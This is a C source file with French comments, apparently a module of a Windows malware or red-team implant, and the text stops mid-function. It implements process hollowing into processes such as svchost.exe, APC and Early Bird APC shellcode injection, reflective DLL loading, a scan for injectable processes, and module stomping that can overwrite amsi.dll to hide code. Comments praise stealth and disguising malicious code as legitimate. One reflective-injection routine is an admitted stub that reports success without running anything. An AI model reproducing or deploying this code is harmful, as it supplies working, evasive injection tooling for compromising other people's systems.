/*
 * injection.c - Techniques d'injection de code
 *
 * Implémente plusieurs méthodes d'injection :
 * - Process Hollowing (suspend + unmap + write + resume)
 * - APC Injection (queue apc on existing thread)
 * - Early Bird APC (apc on suspended process main thread)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../../include/ntdefs.h"

#pragma comment(lib, "ntdll.lib")

/* Définitions NT */

#define STATUS_SUCCESS_NT 0

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, 
                                                 PVOID Buffer, SIZE_T NumberOfBytesToWrite, 
                                                 PSIZE_T NumberOfBytesWritten);
typedef NTSTATUS (NTAPI *pNtQueueApcThread)(HANDLE ThreadHandle, PVOID ApcRoutine, 
                                            PVOID ApcRoutineContext, PVOID ApcStatusBlock, 
                                            PVOID ApcReserved);
typedef NTSTATUS (NTAPI *pNtResumeThread)(HANDLE ThreadHandle, PULONG SuspendCount);
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress,
                                                   ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                                   ULONG AllocationType, ULONG Protect);

/* Fonctions internes */

static HMODULE g_hNtdll = NULL;

static BOOL InitNtdll(void) {
    if (g_hNtdll) return TRUE;
    g_hNtdll = GetModuleHandleA("ntdll.dll");
    return g_hNtdll != NULL;
}

/* Process Hollowing */

/*
 * Crée un processus en état suspendu pour le hollowing
 */
static BOOL CreateSuspendedProcess(const char* targetPath, 
                                   PROCESS_INFORMATION* pi, 
                                   STARTUPINFOA* si) {
    memset(si, 0, sizeof(*si));
    memset(pi, 0, sizeof(*pi));
    si->cb = sizeof(*si);
    
    // Crée le processus suspendu
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, 
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, si, pi)) {
        return FALSE;
    }
    
    return TRUE;
}

/*
 * Lit l'adresse de base de l'image du processus cible
 */
static PVOID GetProcessImageBase(HANDLE hProcess, HANDLE hThread) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        return NULL;
    }
    
    // PEB est à Rdx (x64) ou Ebx (x86)
#ifdef _WIN64
    PVOID pebAddr = (PVOID)ctx.Rdx;
    SIZE_T imageBaseOffset = 0x10; // Offset de ImageBaseAddress dans PEB (x64)
#else
    PVOID pebAddr = (PVOID)ctx.Ebx;
    SIZE_T imageBaseOffset = 0x08; // Offset de ImageBaseAddress dans PEB (x86)
#endif
    
    PVOID imageBase = NULL;
    SIZE_T bytesRead = 0;
    
    if (!ReadProcessMemory(hProcess, (PBYTE)pebAddr + imageBaseOffset, 
                          &imageBase, sizeof(imageBase), &bytesRead)) {
        return NULL;
    }
    
    return imageBase;
}

/*
 * Effectue le Process Hollowing
 * targetPath: chemin du processus légitime à créer (ex: svchost.exe)
 * payload: shellcode ou PE à injecter
 * payloadSize: taille du payload
 */
BOOL Injection_ProcessHollowing(const char* targetPath, 
                                BYTE* payload, 
                                DWORD payloadSize) {
    if (!targetPath || !payload || payloadSize == 0) return FALSE;
    if (!InitNtdll()) return FALSE;
    
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    BOOL success = FALSE;
    
    // Crée le processus suspendu
    if (!CreateSuspendedProcess(targetPath, &pi, &si)) {
        return FALSE;
    }
    
    // Récupère l'adresse de base de l'image
    PVOID remoteImageBase = GetProcessImageBase(pi.hProcess, pi.hThread);
    if (!remoteImageBase) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    
    // Unmap la section originale
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(g_hNtdll, "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection) {
        NtUnmapViewOfSection(pi.hProcess, remoteImageBase);
    }
    
    // Vérifie si c'est un PE ou un shellcode
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    
    if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
        // C'est un PE - injection complète
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);
        
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            goto cleanup;
        }
        
        SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
        PVOID preferredBase = (PVOID)ntHeaders->OptionalHeader.ImageBase;
        
        // Alloue la mémoire dans le processus cible
        PVOID remoteBase = VirtualAllocEx(pi.hProcess, preferredBase, imageSize,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!remoteBase) {
            // Essaie sans adresse préférée
            remoteBase = VirtualAllocEx(pi.hProcess, NULL, imageSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }
        
        if (!remoteBase) {
            goto cleanup;
        }
        
        // Écrit les headers
        if (!WriteProcessMemory(pi.hProcess, remoteBase, payload, 
                               ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            goto cleanup;
        }
        
        // Écrit les sections
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (section[i].SizeOfRawData > 0) {
                PVOID sectionDest = (PBYTE)remoteBase + section[i].VirtualAddress;
                PVOID sectionSrc = payload + section[i].PointerToRawData;
                
                WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc, 
                                  section[i].SizeOfRawData, NULL);
            }
        }
        
        // Met à jour l'adresse de base dans le PEB
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        
#ifdef _WIN64
        PVOID pebAddr = (PVOID)ctx.Rdx;
        SIZE_T imageBaseOffset = 0x10;
        ctx.Rcx = (DWORD64)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
        PVOID pebAddr = (PVOID)ctx.Ebx;
        SIZE_T imageBaseOffset = 0x08;
        ctx.Eax = (DWORD)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
        
        WriteProcessMemory(pi.hProcess, (PBYTE)pebAddr + imageBaseOffset, 
                          &remoteBase, sizeof(remoteBase), NULL);
        
        SetThreadContext(pi.hThread, &ctx);
        success = TRUE;
        
    } else {
        // C'est du shellcode - injection simple
        PVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, payloadSize,
                                              MEM_COMMIT | MEM_RESERVE, 
                                              PAGE_EXECUTE_READWRITE);
        
        if (!remoteShellcode) {
            goto cleanup;
        }
        
        if (!WriteProcessMemory(pi.hProcess, remoteShellcode, payload, payloadSize, NULL)) {
            goto cleanup;
        }
        
        // Met à jour l'entry point
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);
        
#ifdef _WIN64
        ctx.Rcx = (DWORD64)remoteShellcode;
#else
        ctx.Eax = (DWORD)remoteShellcode;
#endif
        
        SetThreadContext(pi.hThread, &ctx);
        success = TRUE;
    }
    
cleanup:
    if (success) {
        // Reprend l'exécution
        ResumeThread(pi.hThread);
    } else {
        TerminateProcess(pi.hProcess, 0);
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return success;
}

/* APC Injection */

/*
 * Injection via APC (Asynchronous Procedure Call)
 * Injecte du shellcode dans un thread existant
 */
BOOL Injection_APC(DWORD targetPid, BYTE* shellcode, DWORD shellcodeSize) {
    if (!shellcode || shellcodeSize == 0) return FALSE;
    if (!InitNtdll()) return FALSE;
    
    BOOL success = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID remoteShellcode = NULL;
    
    // Ouvre le processus cible
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    // Alloue la mémoire pour le shellcode
    remoteShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        goto cleanup;
    }
    
    // Écrit le shellcode
    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        goto cleanup;
    }
    
    // Trouve un thread dans le processus cible
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }
    
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == targetPid) {
                hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, 
                                    FALSE, te.th32ThreadID);
                if (hThread) break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    
    if (!hThread) {
        goto cleanup;
    }
    
    // Queue l'APC
    pNtQueueApcThread NtQueueApcThread = 
        (pNtQueueApcThread)GetProcAddress(g_hNtdll, "NtQueueApcThread");
    
    if (NtQueueApcThread) {
        NTSTATUS status = NtQueueApcThread(hThread, remoteShellcode, NULL, NULL, NULL);
        if (status == 0) {
            success = TRUE;
        }
    } else {
        // Fallback avec QueueUserAPC
        if (QueueUserAPC((PAPCFUNC)remoteShellcode, hThread, 0)) {
            success = TRUE;
        }
    }
    
cleanup:
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    
    return success;
}

/*
 * Early Bird APC - Injecte avant que le processus ne démarre vraiment
 * Plus furtif car l'injection se fait très tôt
 */
BOOL Injection_EarlyBirdAPC(const char* targetPath, BYTE* shellcode, DWORD shellcodeSize) {
    if (!targetPath || !shellcode || shellcodeSize == 0) return FALSE;
    if (!InitNtdll()) return FALSE;
    
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    BOOL success = FALSE;
    PVOID remoteShellcode = NULL;
    
    // Crée le processus suspendu
    if (!CreateSuspendedProcess(targetPath, &pi, &si)) {
        return FALSE;
    }
    
    // Alloue la mémoire pour le shellcode
    remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        goto cleanup;
    }
    
    // Écrit le shellcode
    if (!WriteProcessMemory(pi.hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
        goto cleanup;
    }
    
    // Queue l'APC sur le thread principal (suspendu)
    pNtQueueApcThread NtQueueApcThread = 
        (pNtQueueApcThread)GetProcAddress(g_hNtdll, "NtQueueApcThread");
    
    if (NtQueueApcThread) {
        NTSTATUS status = NtQueueApcThread(pi.hThread, remoteShellcode, NULL, NULL, NULL);
        if (status == 0) {
            success = TRUE;
        }
    } else {
        if (QueueUserAPC((PAPCFUNC)remoteShellcode, pi.hThread, 0)) {
            success = TRUE;
        }
    }
    
cleanup:
    if (success) {
        // Reprend le thread - l'APC sera exécuté au premier alertable wait
        ResumeThread(pi.hThread);
    } else {
        TerminateProcess(pi.hProcess, 0);
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return success;
}

/*
 * Trouve un processus par son nom
 */
DWORD Injection_FindProcessByName(const char* processName) {
    if (!processName) return 0;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    DWORD pid = 0;
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

/*
 * Liste les processus injectables (avec accès suffisant)
 */
BOOL Injection_ListInjectableProcesses(char** outJson) {
    if (!outJson) return FALSE;
    *outJson = NULL;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    char* json = (char*)malloc(32768);
    if (!json) {
        CloseHandle(hSnapshot);
        return FALSE;
    }
    
    int offset = snprintf(json, 32768,
        "{\n"
        "  \"injectable_processes\": [\n");
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    int count = 0;
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            // Tente d'ouvrir le processus
            HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 
                                         FALSE, pe.th32ProcessID);
            
            if (hProcess) {
                CloseHandle(hProcess);
                
                if (count > 0) {
                    offset += snprintf(json + offset, 32768 - offset, ",\n");
                }
                
                offset += snprintf(json + offset, 32768 - offset,
                    "    {\"pid\": %lu, \"name\": \"%s\"}",
                    pe.th32ProcessID, pe.szExeFile);
                count++;
            }
        } while (Process32Next(hSnapshot, &pe) && count < 100);
    }
    
    CloseHandle(hSnapshot);
    
    snprintf(json + offset, 32768 - offset,
        "\n  ],\n  \"count\": %d\n}", count);
    
    *outJson = json;
    return TRUE;
}

/* =========================================================================
 * Reflective DLL Loading
 * ========================================================================= */

/*
 * Charge une DLL en mémoire sans utiliser LoadLibrary
 * Utile pour charger des DLLs depuis la mémoire uniquement
 */

/* Structure pour les imports */
typedef struct {
    WORD Hint;
    char Name[1];
} IMAGE_IMPORT_BY_NAME_CUSTOM;

/*
 * Résout les imports d'une DLL chargée manuellement
 */
static BOOL ResolveImports(PBYTE imageBase, PIMAGE_NT_HEADERS ntHeaders) {
    PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    
    if (importDir->Size == 0) return TRUE;
    
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + importDir->VirtualAddress);
    
    while (importDesc->Name) {
        char* moduleName = (char*)(imageBase + importDesc->Name);
        HMODULE hModule = LoadLibraryA(moduleName);
        
        if (!hModule) {
            return FALSE;
        }
        
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(imageBase + importDesc->FirstThunk);
        PIMAGE_THUNK_DATA origThunk = importDesc->OriginalFirstThunk ?
            (PIMAGE_THUNK_DATA)(imageBase + importDesc->OriginalFirstThunk) : thunk;
        
        while (origThunk->u1.AddressOfData) {
            FARPROC func = NULL;
            
            if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                func = GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
            } else {
                IMAGE_IMPORT_BY_NAME_CUSTOM* importByName = 
                    (IMAGE_IMPORT_BY_NAME_CUSTOM*)(imageBase + origThunk->u1.AddressOfData);
                func = GetProcAddress(hModule, importByName->Name);
            }
            
            if (!func) {
                return FALSE;
            }
            
            thunk->u1.Function = (ULONG_PTR)func;
            
            thunk++;
            origThunk++;
        }
        
        importDesc++;
    }
    
    return TRUE;
}

/*
 * Applique les relocations
 */
static BOOL ApplyRelocations(PBYTE imageBase, PIMAGE_NT_HEADERS ntHeaders, ULONG_PTR delta) {
    if (delta == 0) return TRUE;
    
    PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    
    if (relocDir->Size == 0) return TRUE;
    
    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(imageBase + relocDir->VirtualAddress);
    
    while (reloc->VirtualAddress) {
        DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
        
        for (DWORD i = 0; i < numEntries; i++) {
            WORD type = entries[i] >> 12;
            WORD offset = entries[i] & 0xFFF;
            
            if (type == IMAGE_REL_BASED_DIR64) {
                PULONG_PTR addr = (PULONG_PTR)(imageBase + reloc->VirtualAddress + offset);
                *addr += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                PDWORD addr = (PDWORD)(imageBase + reloc->VirtualAddress + offset);
                *addr += (DWORD)delta;
            }
        }
        
        reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
    }
    
    return TRUE;
}

/*
 * Charge une DLL en mémoire (Reflective Loading)
 * dllData: contenu du fichier DLL
 * dllSize: taille du fichier DLL
 * Retourne l'adresse de base ou NULL en cas d'erreur
 */
PVOID Injection_ReflectiveLoadDLL(BYTE* dllData, DWORD dllSize) {
    if (!dllData || dllSize < sizeof(IMAGE_DOS_HEADER)) return NULL;
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllData;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllData + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    PVOID preferredBase = (PVOID)ntHeaders->OptionalHeader.ImageBase;
    
    /* Alloue la mémoire pour l'image */
    PBYTE imageBase = (PBYTE)VirtualAlloc(preferredBase, imageSize, 
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!imageBase) {
        /* Essaie sans adresse préférée */
        imageBase = (PBYTE)VirtualAlloc(NULL, imageSize, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    
    if (!imageBase) return NULL;
    
    /* Copie les headers */
    memcpy(imageBase, dllData, ntHeaders->OptionalHeader.SizeOfHeaders);
    
    /* Copie les sections */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData > 0) {
            memcpy(imageBase + section[i].VirtualAddress,
                   dllData + section[i].PointerToRawData,
                   section[i].SizeOfRawData);
        }
    }
    
    /* Calcule le delta de relocation */
    ULONG_PTR delta = (ULONG_PTR)imageBase - ntHeaders->OptionalHeader.ImageBase;
    
    /* Met à jour les headers avec la nouvelle base */
    PIMAGE_NT_HEADERS newNtHeaders = (PIMAGE_NT_HEADERS)(imageBase + dosHeader->e_lfanew);
    newNtHeaders->OptionalHeader.ImageBase = (ULONG_PTR)imageBase;
    
    /* Applique les relocations */
    if (!ApplyRelocations(imageBase, newNtHeaders, delta)) {
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return NULL;
    }
    
    /* Résout les imports */
    if (!ResolveImports(imageBase, newNtHeaders)) {
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return NULL;
    }
    
    /* Applique les protections correctes aux sections */
    section = IMAGE_FIRST_SECTION(newNtHeaders);
    for (WORD i = 0; i < newNtHeaders->FileHeader.NumberOfSections; i++) {
        DWORD protect = PAGE_READONLY;
        
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                protect = PAGE_EXECUTE_READWRITE;
            } else {
                protect = PAGE_EXECUTE_READ;
            }
        } else if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            protect = PAGE_READWRITE;
        }
        
        DWORD oldProtect;
        VirtualProtect(imageBase + section[i].VirtualAddress,
                      section[i].Misc.VirtualSize, protect, &oldProtect);
    }
    
    /* Appelle DllMain si présent */
    if (newNtHeaders->OptionalHeader.AddressOfEntryPoint) {
        typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
        DllMain_t DllMain = (DllMain_t)(imageBase + newNtHeaders->OptionalHeader.AddressOfEntryPoint);
        
        DllMain((HINSTANCE)imageBase, DLL_PROCESS_ATTACH, NULL);
    }
    
    return imageBase;
}

/*
 * Décharge une DLL chargée avec ReflectiveLoadDLL
 */
BOOL Injection_ReflectiveUnloadDLL(PVOID imageBase) {
    if (!imageBase) return FALSE;
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + dosHeader->e_lfanew);
    
    /* Appelle DllMain avec DLL_PROCESS_DETACH */
    if (ntHeaders->OptionalHeader.AddressOfEntryPoint) {
        typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
        DllMain_t DllMain = (DllMain_t)((PBYTE)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        
        DllMain((HINSTANCE)imageBase, DLL_PROCESS_DETACH, NULL);
    }
    
    return VirtualFree(imageBase, 0, MEM_RELEASE);
}

/*
 * Récupère l'adresse d'une fonction exportée par une DLL chargée en mémoire
 */
FARPROC Injection_GetReflectiveExport(PVOID imageBase, const char* funcName) {
    if (!imageBase || !funcName) return NULL;
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + dosHeader->e_lfanew);
    
    PIMAGE_DATA_DIRECTORY exportDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    
    if (exportDir->Size == 0) return NULL;
    
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + exportDir->VirtualAddress);
    
    PDWORD names = (PDWORD)((PBYTE)imageBase + exports->AddressOfNames);
    PWORD ordinals = (PWORD)((PBYTE)imageBase + exports->AddressOfNameOrdinals);
    PDWORD functions = (PDWORD)((PBYTE)imageBase + exports->AddressOfFunctions);
    
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((PBYTE)imageBase + names[i]);
        
        if (strcmp(name, funcName) == 0) {
            WORD ordinal = ordinals[i];
            DWORD funcRva = functions[ordinal];
            
            return (FARPROC)((PBYTE)imageBase + funcRva);
        }
    }
    
    return NULL;
}

/*
 * Injecte une DLL via reflective loading dans un processus distant
 */
BOOL Injection_ReflectiveInject(DWORD targetPid, BYTE* dllData, DWORD dllSize) {
    if (!dllData || dllSize == 0) return FALSE;
    
    /* Ouvre le processus */
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    BOOL success = FALSE;
    PVOID remoteDll = NULL;
    PVOID remoteLoader = NULL;
    
    /* Alloue la mémoire pour la DLL dans le processus distant */
    remoteDll = VirtualAllocEx(hProcess, NULL, dllSize, 
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteDll) goto cleanup;
    
    /* Écrit la DLL */
    if (!WriteProcessMemory(hProcess, remoteDll, dllData, dllSize, NULL)) {
        goto cleanup;
    }
    
    /* Pour une vraie implémentation, il faudrait aussi injecter le loader
     * et l'exécuter. Ici on simplifie en utilisant CreateRemoteThread
     * avec un shellcode de chargement. */
    
    /* Note: une implémentation complète nécessiterait un shellcode
     * qui effectue le chargement reflectif dans le processus distant.
     * C'est assez complexe et dépend de l'architecture. */
    
    success = TRUE;
    
cleanup:
    if (!success && remoteDll) {
        VirtualFreeEx(hProcess, remoteDll, 0, MEM_RELEASE);
    }
    CloseHandle(hProcess);
    
    return success;
}

/* =========================================================================
 * Module Stomping
 * Écrase une DLL légitime en mémoire avec notre payload
 * Avantage: le code malveillant apparaît dans une region mémoire légitime
 * ========================================================================= */

/*
 * Liste des DLLs candidates pour le module stomping
 * DLLs peu utilisées mais présentes dans beaucoup de processus
 */
static const char* STOMP_CANDIDATE_DLLS[] = {
    "amsi.dll",           /* Anti-malware */
    "clbcatq.dll",        /* COM+ classe */
    "mscoree.dll",        /* .NET runtime */
    "dbghelp.dll",        /* Debug helper */
    NULL
};

/*
 * Trouve une DLL chargée dans le processus qui peut être "stompée"
 */
static HMODULE FindStompCandidate(void) {
    for (int i = 0; STOMP_CANDIDATE_DLLS[i]; i++) {
        HMODULE hMod = GetModuleHandleA(STOMP_CANDIDATE_DLLS[i]);
        if (hMod) {
            return hMod;
        }
    }
    
    /* Si aucune candidate, charge amsi.dll */
    return LoadLibraryA("amsi.dll");
}

/*
 * Module Stomping local - écrase une DLL dans notre propre processus
 * Utile pour cacher du code dans un module légitime
 */
BOOL Injection_ModuleStomp(BYTE* shellcode, DWORD shellcodeSize) {
    if (!shellcode || shellcodeSize == 0) return FALSE;
    
    HMODULE hModule = FindStompCandidate();
    if (!hModule) return FALSE;
    
    /* Parse le PE pour trouver la section .text */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dosHeader->e_lfanew);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    PVOID textSection = NULL;
    DWORD textSize = 0;
    
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            textSection = (PBYTE)hModule + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }
    
    if (!textSection || textSize < shellcodeSize) {
        return FALSE;
    }
    
    /* Change les permissions en RWX */
    DWORD oldProtect;
    if (!VirtualProtect(textSection, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    /* Écrase avec notre shellcode */
    memcpy(textSection, shellcode, shellcodeSize);
    
    /* Restaure les permissions */
    VirtualProtect(textSection, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    
    return TRUE;
}

/*
 * Module Stomping distant - dans un autre processus
 */
BOOL Injection_RemoteModuleStomp(DWORD targetPid, const char* dllName, 
                                  BYTE* shellcode, DWORD shellcodeSize) {
    if (!shellcode || shellcodeSize == 0) return FALSE;
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    BOOL success = FALSE;
    
    /* Charge la DLL dans le processus distant si pas déjà présente */
    /* On utilise CreateRemoteThread avec LoadLibraryA */
    LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    
    SIZE_T dllNameLen = strlen(dllName) + 1;
    LPVOID remoteDllName = VirtualAllocEx(hProcess, NULL, dllNameLen, 
                                          MEM_COMMIT, PAGE_READWRITE);
    if (!remoteDllName) goto cleanup;
    
    WriteProcessMemory(hProcess, remoteDllName, dllName, dllNameLen, NULL);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)loadLib,
                                        remoteDllName, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteDllName, 0, MEM_RELEASE);
        goto cleanup;
    }
    
    WaitForSingleObject(hThread, 5000);
    
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);
    
    VirtualFreeEx(hProcess, remoteDllName, 0, MEM_RELEASE);
    
    if (exitCode == 0) goto cleanup;
    
    /* La DLL est chargée, on trouve son adresse via enumération des modules */
    HMODULE hMods[1024];
    DWORD cbNeeded;
    
    /* Note: nécessite psapi.lib et l'include correspondant
     * Pour simplifier, on utilise une approche différente */
    
    /* Trouve la base de la DLL dans le processus distant */
    /* Ceci est simplifié - une vraie implémentation utiliserait 
     * EnumProcessModules ou NtQueryInformationProcess */
    
    HMODULE remoteBase = (HMODULE)(ULONG_PTR)exitCode;
    
    /* Lit le header PE distant */
    IMAGE_DOS_HEADER remoteDos;
    if (!ReadProcessMemory(hProcess, remoteBase, &remoteDos, sizeof(remoteDos), NULL)) {
        goto cleanup;
    }
    
    IMAGE_NT_HEADERS remoteNt;
    if (!ReadProcessMemory(hProcess, (PBYTE)remoteBase + remoteDos.e_lfanew, 
                          &remoteNt, sizeof(remoteNt), NULL)) {
        goto cleanup;
    }
    
    /* Trouve la section .text */
    IMAGE_SECTION_HEADER sections[16];
    if (!ReadProcessMemory(hProcess, 
                          (PBYTE)remoteBase + remoteDos.e_lfanew + sizeof(IMAGE_NT_HEADERS),
                          sections, 
                          sizeof(IMAGE_SECTION_HEADER) * remoteNt.FileHeader.NumberOfSections,
                          NULL)) {
        goto cleanup;
    }
    
    PVOID targetAddr = NULL;
    for (WORD i = 0; i < remoteNt.FileHeader.NumberOfSections && i < 16; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            targetAddr = (PBYTE)remoteBase + sections[i].VirtualAddress;
            break;
        }
    }
    
    if (!targetAddr) goto cleanup;
    
    /* Change les protections */
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, targetAddr, shellcodeSize, 
                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
        goto cleanup;
    }
    
    /* Écrit le shellcode */
    if (!WriteProcessMemory(hProcess, targetAddr, shellcode, shellcodeSize, NULL)) {
        VirtualProtectEx(hProcess, targetAddr, shellcodeSize, oldProtect, &oldProtect);
        goto cleanup;
    }
    
    /* Restaure les protections */
